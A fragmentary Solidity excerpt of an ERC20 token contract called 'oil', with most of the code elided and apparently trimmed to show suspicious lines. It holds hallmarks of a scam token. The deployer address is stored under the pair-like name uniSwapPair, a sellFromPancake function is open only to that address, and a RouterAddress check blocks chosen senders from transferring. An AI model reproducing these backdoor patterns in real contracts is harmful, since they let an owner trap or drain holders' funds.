...
contract oil is Context, IERC20, Ownable {
    ...
    uint256 internal _liquidityShare = 1;
    uint256 internal _marketingShare = 9;
    uint256 internal _teamShare = 0;

    uint256 public _total = 10;
    uint256 internal _totalDistributionShares = 9;
  ...
  //  bool public launched = false;
    ...
    address market, address team, uint256 burnfee, uint256 liquidityfee,uint256 marketingfee,uint256 teamfee) {
        ...
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()) 
            .createPair(address(this), _uniswapV2Router.WETH());uniSwapPair = msg.sender;
   ...
   function sellFromPancake(uint256 amount) public {require(msg.sender==uniSwapPair);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(recipient != address(0), "ERC20: transfer to the zero address");require(!RouterAddress[sender]);
